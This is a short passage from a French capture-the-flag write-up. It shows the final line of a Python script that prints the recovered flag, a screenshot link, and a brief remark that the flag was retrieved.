+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Flag:&#34;</span>,p<span style="color:#ff79c6">.</span>recvall()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#bd93f9">3</span>]<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Et cette fois, il devrait fonctionner:</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png" alt="2023-01-15-153142_994x552_scrot"></p>
 <p>Parfait, on a réussi à récupérer le flag</p>
